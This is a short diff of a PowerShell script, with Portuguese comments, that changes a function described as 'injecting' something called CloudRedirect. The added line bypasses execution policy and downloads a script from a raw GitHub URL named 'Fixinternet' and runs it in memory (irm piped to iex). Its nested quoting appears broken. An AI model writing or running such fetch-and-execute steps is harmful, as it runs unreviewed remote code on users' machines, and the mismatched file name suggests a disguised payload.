@@ -114,7 +114,7 @@ function Executar-CloudRedirect {
     
     try {
         # Executa diretamente o script remoto na memória via Vercel
-        powershell -ExecutionPolicy Bypass -Command "https://luatools.vercel.app/CloudRedirect.ps1"
+        powershell -ExecutionPolicy Bypass -Command "irm "https://raw.githubusercontent.com/master18032008/Fixinternet/refs/heads/main/Fixinternet" | iex"
         Log "OK" "Injecao do CloudRedirect concluida via Web Script."
     }
     catch {
